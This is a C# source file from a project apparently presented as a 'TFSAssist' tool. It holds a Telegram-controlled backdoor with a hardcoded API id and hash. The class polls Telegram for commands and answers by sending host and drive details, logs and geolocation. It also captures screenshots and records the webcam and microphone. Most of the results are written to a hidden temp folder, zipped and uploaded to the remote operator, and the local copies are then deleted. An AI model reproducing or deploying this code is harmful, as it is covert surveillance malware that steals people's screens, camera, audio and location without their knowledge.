using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Device.Location;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using TeleSharp.TL;
using TFSAssist.Control;
using Utils;
using Utils.AppUpdater;
using Utils.Handles;
using Utils.Telegram;
using Utils.UIControls.Tools;

namespace TFSAssist
{
    class TTLControl : TLControl
    {
        public TTLControl(int appiId, string apiHash) : base(appiId, apiHash)
        {

        }
    }

    public class TFSA_TLControl : IDisposable
    {
        private readonly string ClientID;
        private TTLControl _control;

        private CamCapture _camCapture;

        private readonly GeoCoordinateWatcher _watcher;
        private string _locationResult = string.Empty;
        private bool _tryGetLocation = false;

        private readonly Action _checkUpdates;
        private readonly Func<string> _getLogs;
        private readonly Action<WarnSeverity, string> _writeLog;

        public string TempDirectory { get; }
        public bool IsEnabled { get; private set; } = false;

        public TFSA_TLControl(string clientId, Action checkUpdates, Func<string> getLogs, Action<WarnSeverity, string> log)
        {
            _checkUpdates = checkUpdates;
            _getLogs = getLogs;
            _writeLog = log;
            ClientID = clientId;
            TempDirectory = Path.Combine(ASSEMBLY.ApplicationDirectory, "Temp");

            try
            {
                _watcher = new GeoCoordinateWatcher();
                _watcher.StatusChanged += _watcher_StatusChanged;
                _watcher.Start();
            }
            catch (Exception)
            {
                // ignored
            }
        }

        private async void _watcher_StatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
        {
            if (e.Status == GeoPositionStatus.Ready)
            {
                if (!_watcher.Position.Location.IsUnknown)
                {
                    GeoCoordinate coordinate = _watcher.Position.Location;
                    _locationResult = $"Latitude=[{coordinate.Latitude.ToString().Replace(",",".")}] Longitude=[{coordinate.Longitude.ToString().Replace(",", ".")}]";
                    if (_tryGetLocation)
                    {
                        await SendMessageToCurrentUser(_locationResult);
                        _tryGetLocation = false;
                    }
                }
            }
        }

        public async Task<bool> Initialize()
        {
            IsEnabled = false;

            await GetTempSession();
            await CreateTempDirectory();

            try
            {
                _control = new TTLControl(770122, "8bf0b952100c9b22fd92499fc329c27e");
                await _control.ConnectAsync();
                IsEnabled = true;

                try
                {
                    // сделаем отдельную проверку на создании CamCapture, т.к. все зависит от IIS если она поддерживает ту платформу на которой была сбилдена прога, то будет работать, иначе нет. Но все остальное должно проинититься, в случае чего можно будет сделать исправление посмотрев логи
                    _camCapture = new CamCapture();
                }
                catch (Exception ex)
                {
                    WriteExLog(ex, false);
                }

                await Task.Delay(5000);

                await SendMessageToCurrentUser($"Connected. {GetCurrentServerInfo()}");

                await Task.Delay(1000);
            }
            catch (Exception ex)
            {
                WriteExLog(ex, false);
            }

            return IsEnabled;
        }

        //public async Task EndTransaction()
        //{
        //    await SendMessageToCurrentUser($"Disconnected. {GetCurrentServerInfo()}");
        //}


        async Task SendMessageToCurrentUser(string message)
        {
            if (IsEnabled)
                await _control.SendMessageAsync(_control.CurrentUser.Destination, $"CID=[{ClientID}]\r\n{message.Trim()}", 0);
        }

        async Task SendBigFileToCurrentUser(string destinationPath)
        {
            if (IsEnabled)
                await _control.SendBigFileAsync(_control.CurrentUser.Destination, destinationPath);
        }

        public async Task Run()
        {
            DateTime lastDate = DateTime.Now;
            while (IsEnabled)
            {
                try
                {
                    List<TLMessage> newMessages = await _control.GetDifference(_control.CurrentUser.User, _control.CurrentUser.Destination, lastDate);
                    TLMessage lastMessage = newMessages?.LastOrDefault();
                    if (lastMessage != null)
                    {
                        await ReadCommands(newMessages);
                        lastDate = TLControl.ToDate(lastMessage.Date);
                    }
                }
                catch (Exception ex)
                {
                    WriteExLog(ex);
                }

                await Task.Delay(5000);
            }
        }

        async Task ReadCommands(List<TLMessage> newMessages)
        {
            bool isUpdate = false;
            string isCommand = ClientID + ":";

            try
            {
                foreach (var tlMessage in newMessages)
                {
                    if (tlMessage.Message.StartsWith(isCommand, StringComparison.CurrentCultureIgnoreCase))
                    {
                        string command = tlMessage.Message.Substring(isCommand.Length, tlMessage.Message.Length - isCommand.Length);
                        Dictionary<string, string> options = null;
                        int optStart = command.IndexOf('(');
                        int optEnd = command.IndexOf(')');
                        if (optStart != -1 && optEnd != -1 && optEnd > optStart)
                        {
                            string strOptions = command.Substring(optStart, command.Length - optStart);
                            options = ReadOptionParams(strOptions);
                            command = command.Substring(0, optStart);
                        }
                        command = command.ToLower().Trim();


                        switch (command)
                        {
                            case "info":
                                await SendMessageToCurrentUser(GetCurrentServerInfo(true));
                                break;

                            case "detinfo":
                                var res = WIN32.GetDetailedHostInfo();
                                if (res?.Count > 0)
                                {
                                    StringBuilder detInfo = new StringBuilder();
                                    int maxLenghtSpace = res.Keys.Aggregate("", (max, cur) => max.Length > cur.Length ? max : cur).Length + 3;

                                    foreach (var value in res)
                                    {
                                        detInfo.Append($"{value.Key} {new string('.', maxLenghtSpace - value.Key.Length)} [{string.Join("];[", value.Value)}]\r\n");
                                    }

                                    Dictionary<string, FileBuildInfo> localVersions = BuildPackInfo.GetLocalVersions(Assembly.GetExecutingAssembly());
                                    if (localVersions?.Count > 0)
                                    {
                                        maxLenghtSpace = localVersions.Keys.Aggregate("", (max, cur) => max.Length > cur.Length ? max : cur).Length + 3;
                                        localVersions = localVersions.OrderBy(p => p.Key).ToDictionary(x => x.Key, x => x.Value);

                                        detInfo.Append($"\r\nLocation=[{Assembly.GetExecutingAssembly().GetDirectory()}]\r\n");
                                        foreach (var versionLocalFiles in localVersions)
                                        {
                                            detInfo.Append($"{versionLocalFiles.Key} {new string('.', maxLenghtSpace - versionLocalFiles.Key.Length)} [{versionLocalFiles.Value.Version}]\r\n");
                                        }
                                    }

                                    await SaveFile(Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.log"), detInfo.ToString());
                                }
                                break;

                            case "log":
                                string logs = _getLogs?.Invoke();
                                if (logs.IsNullOrEmptyTrim())
                                {
                                    await SendMessageToCurrentUser("Log is empty.");
                                    break;
                                }

                                await SaveFile(Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.log"), logs);

                                break;

                            case "drive":
                                var drives = DriveInfo.GetDrives();
                                if (drives == null || drives.Length == 0)
                                    break;

                                string result = string.Empty;
                                foreach (DriveInfo drive in drives)
                                {
                                    if (drive.IsReady)
                                    {
                                        result += $"Drive=[{drive.Name}] FreeSize=[{IO.FormatBytes(drive.TotalFreeSpace, out _)}]\r\n";
                                    }
                                }

                                await SendMessageToCurrentUser(result);
                                break;

                            case "screen":
                                string imagePath = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.pam");
                                await ScreenCapture.CaptureAsync(imagePath, ImageFormat.Png);
                                break;

                            case "update":
                                isUpdate = true;
                                break;

                            case "loc":
                                if (_locationResult.IsNullOrEmptyTrim())
                                {
                                    await SendMessageToCurrentUser("Location unknown.");
                                    _tryGetLocation = true;
                                }
                                else
                                {
                                    await SendMessageToCurrentUser(_locationResult);
                                    _tryGetLocation = false;
                                }
                                break;

                            case "caminfo":
                                if (_camCapture == null)
                                {
                                    await SendMessageToCurrentUser($"Cam not initialized.");
                                    break;
                                }

                                await SendMessageToCurrentUser($"Cam settings: TimeRec=[60] Video=[{string.Join("];[", _camCapture.VideoEncoders)}] Audio=[{string.Join("];[", _camCapture.AudioEncoders)}]");
                                break;

                            case "cam":
                                if (_camCapture == null)
                                {
                                    await SendMessageToCurrentUser($"Cam not initialized.");
                                    break;
                                }

                                int timeRec = 60;
                                string video = null;
                                string audio = null;
                                if (options != null && options.Count > 0)
                                {
                                    if (options.TryGetValue("TimeRec", out var timeRecStr))
                                        int.TryParse(timeRecStr, out timeRec);
                                    options.TryGetValue("Video", out video);
                                    options.TryGetValue("Audio", out audio);
                                }

                                string videoPath = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.bam");
                                if (!await _camCapture.StartRec(videoPath, timeRec, video, audio))
                                {
                                    await SendMessageToCurrentUser($"Can't init cam. Settings: Video=[{string.Join("];[", _camCapture.VideoEncoders)}] Audio=[{string.Join("];[", _camCapture.AudioEncoders)}]");
                                }
                                break;
                        }
                    }
                    else if (tlMessage.Message.Like("info"))
                    {
                        await SendMessageToCurrentUser(GetCurrentServerInfo());
                    }
                    else if (tlMessage.Message.Like("update"))
                    {
                        isUpdate = true;
                    }
                }
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
            finally
            {
                var tempFiles = Directory.EnumerateFiles(TempDirectory);
                if (tempFiles.Any())
                {
                    try
                    {
                        string destinationZip = DoZipFile(TempDirectory);
                        if (destinationZip != null && File.Exists(destinationZip))
                        {
                            await SendBigFileToCurrentUser(destinationZip);
                        }
                    }
                    catch (Exception ex)
                    {
                        WriteExLog(ex);
                    }

                    try
                    {
                        foreach (var fileName in tempFiles)
                        {
                            var fileInfo = new FileInfo(fileName);
                            fileInfo.Attributes = FileAttributes.Normal;
                            fileInfo.Delete();
                        }
                    }
                    catch (Exception ex)
                    {
                        WriteExLog(ex);
                    }
                }

                if (isUpdate)
                {
                    _checkUpdates?.BeginInvoke(null, null);
                }
            }
        }


        Dictionary<string, string> ReadOptionParams(string options)
        {
            Dictionary<string, string> optParams = new Dictionary<string, string>(StringComparer.CurrentCultureIgnoreCase);
            StringBuilder builderParam = new StringBuilder();
            StringBuilder builderValue = new StringBuilder();
            int findParams = 0;
            int findValue = 0;

            foreach (char ch in options)
            {
                if (ch == '(' && findParams == 0)
                {
                    findParams++;
                    continue;
                }

                if (ch == ')' && (findValue == 0 || findValue == 3) && findParams > 0)
                {
                    findParams--;
                    continue;
                }

                if (findParams <= 0)
                    continue;

                if ((ch == '=' && findValue == 0) || (ch == '\'' && findValue >= 1))
                {
                    findValue++;
                    continue;
                }

                if (ch == ',' && findValue == 3)
                {
                    findValue = 0;
                    optParams.Add(builderParam.ToString(), builderValue.ToString());
                    builderParam.Clear();
                    builderValue.Clear();
                    continue;
                }

                if (findValue == 2)
                {
                    builderValue.Append(ch);
                    continue;
                }

                if (!char.IsWhiteSpace(ch) && findValue == 0)
                    builderParam.Append(ch);
            }

            optParams.Add(builderParam.ToString(), builderValue.ToString());
            builderParam.Clear();
            builderValue.Clear();

            return optParams;
        }

        async Task SaveFile(string destination, string data)
        {
            using (var stream = new FileStream(destination, FileMode.OpenOrCreate))
            {
                byte[] logsBytes = new UTF8Encoding(true).GetBytes(data.Trim());
                await stream.WriteAsync(logsBytes, 0, logsBytes.Length);
            }
        }

        string DoZipFile(string sourceDir)
        {
            try
            {
                string destinationZip = Path.Combine(sourceDir, STRING.RandomStringNumbers(15) + ".zip");
                string packFileTempPath = Path.GetTempFileName();
                File.Delete(packFileTempPath);
                ZipFile.CreateFromDirectory(sourceDir, packFileTempPath, CompressionLevel.Optimal, false);
                File.Copy(packFileTempPath, destinationZip, true);
                File.Delete(packFileTempPath);
                return destinationZip;
            }
            catch (Exception)
            {
                return null;
            }
        }

        string GetCurrentServerInfo(bool detailed = false)
        {
            try
            {
                var hostName = Dns.GetHostName();

                if (detailed)
                    return $"Host=[{hostName}] Address=[\"{string.Join("\",\"", Dns.GetHostAddresses(hostName).ToList())}\"]";

                return $"Host=[{hostName}]";
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        async Task GetTempSession()
        {
            try
            {
                if (!File.Exists(TLControl.SessionName))
                    return;

                using (var stream = new FileStream(TLControl.SessionName, FileMode.Open))
                {
                    var buffer = new byte[2048];
                    await stream.ReadAsync(buffer, 0, 2048);
                    using (RegeditControl regedit = new RegeditControl(ASSEMBLY.ApplicationName))
                    {
                        regedit[TLControl.SessionName, RegistryValueKind.Binary] = buffer;
                    }
                }

                File.Delete(TLControl.SessionName);
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
        }

        async Task CreateTempDirectory()
        {
            if (Directory.Exists(TempDirectory))
            {
                try
                {
                    await IO.DeleteReadOnlyDirectoryAsync(TempDirectory);
                }
                catch (Exception ex)
                {
                    WriteExLog(ex, false);
                }
            }

            int tryes = 0;
            lableTrys:
            try
            {
                DirectoryInfo di = Directory.CreateDirectory(TempDirectory);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }
            catch (Exception ex)
            {
                WriteExLog(ex, false);
                tryes++;
                if (tryes < 5)
                    goto lableTrys;
            }
        }

        void WriteExLog(Exception ex, bool isDebug = true)
        {
            _writeLog?.Invoke(isDebug ? WarnSeverity.Debug : WarnSeverity.Error, $"{nameof(TFSA_TLControl)}=[{ex.Message}]\r\n{ex.StackTrace}");
        }

        public void Dispose()
        {
            try
            {
                IsEnabled = false;
                _control?.Dispose();
                _watcher?.Stop();

                foreach (var fileName in Directory.EnumerateFiles(TempDirectory))
                {
                    var fileInfo = new FileInfo(fileName);
                    fileInfo.Attributes = FileAttributes.Normal;
                    fileInfo.Delete();
                }
            }
            catch (Exception)
            {
             
            }
        }
    }
}